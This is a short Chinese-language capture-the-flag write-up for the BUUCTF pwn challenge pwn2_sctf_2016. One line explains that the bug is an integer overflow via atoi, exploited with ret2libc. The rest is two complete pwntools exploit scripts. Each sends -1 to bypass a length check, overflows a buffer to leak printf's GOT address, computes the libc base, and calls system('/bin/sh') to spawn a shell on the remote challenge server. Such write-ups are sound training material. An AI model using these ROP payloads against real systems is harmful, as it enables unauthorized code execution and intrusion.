# 分析

来自[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#pwn2_sctf_2016)

这是一道ret2libc，使用整数溢出漏洞，当使用atoi函数的时候要注意是有符号还是无符号整数

# exp

```python
#第一种：给printf传递两个参数，第一个带有%s的字符串，第二个是printf_got地址
from pwn import *
from LibcSearcher import *	#使用本地so动态连接，可以不用
context(os='linux', arch='i386', log_level='debug')
#io = process('./pwn2_sctf_2016')
io=remote('node5.buuoj.cn',28961)
elf = ELF('./pwn2_sctf_2016')
libc = ELF('./libc-2.23.so')

printf_got = elf.got['printf']
printf_plt = elf.plt['printf']
main_addr = elf.sym['main']
fmt_str=0x080486F8

io.sendlineafter('read?',b'-1')    #1.绕过限制
payload1 = b'A'*0x30+p32(printf_plt)+p32(main_addr)+p32(fmt_str)+p32(printf_got)    #2.泄露lib
io.sendlineafter(b'data!\n',payload1)
io.recvuntil('said: ')  #函数结束前的输出字符串
io.recvuntil('said: ')  #rop执行后输出的字符串，其中有函数地址
printf_addr = u32(io.recv(4))   #接收泄露的printf的地址
print('lib=',hex(printf_addr))

libc_base=printf_addr-libc.symbols['printf']
system_addr=libc_base+libc.symbols['system']
bin_sh=libc_base+next(libc.search(b'/bin/sh'))

io.sendlineafter(b'read?',b'-1')
payload2 = b'A'*0x30+p32(system_addr)+p32(0xdeadbeef)+p32(bin_sh)   #3.构造shell
io.recvuntil(b'data!\n')
io.sendline(payload2)
io.interactive()
```

```python
#第二种，只给printf传递printf_got的参数
from pwn import *
from LibcSearcher import * #使用本地so动态连接，可以不用
context(os='linux', arch='i386', log_level='debug')
#io = process('./pwn2_sctf_2016')
io=remote('node5.buuoj.cn',28961)
elf = ELF('./pwn2_sctf_2016')
libc = ELF('./libc-2.23.so')

printf_got = elf.got['printf']
printf_plt = elf.plt['printf']
main_addr = elf.sym['main']

io.sendlineafter('read?',b'-1')#1.绕过限制
payload1 = b'A'*0x30+p32(printf_plt)+p32(main_addr)+p32(printf_got)	#2.泄露lib
io.sendlineafter(b'data!\n',payload1)
io.recvuntil('\n')
printf_addr = u32(io.recv(4))
print('lib=',hex(printf_addr))

libc_base=printf_addr-libc.symbols['printf']
system_addr=libc_base+libc.symbols['system']
bin_sh=libc_base+next(libc.search(b'/bin/sh'))

io.sendlineafter(b'read?',b'-1')
payload2 = b'A'*0x30+p32(system_addr)+p32(0xdeadbeef)+p32(bin_sh)	#3.构造shell
io.recvuntil(b'data!\n')
io.sendline(payload2)
io.interactive()
```

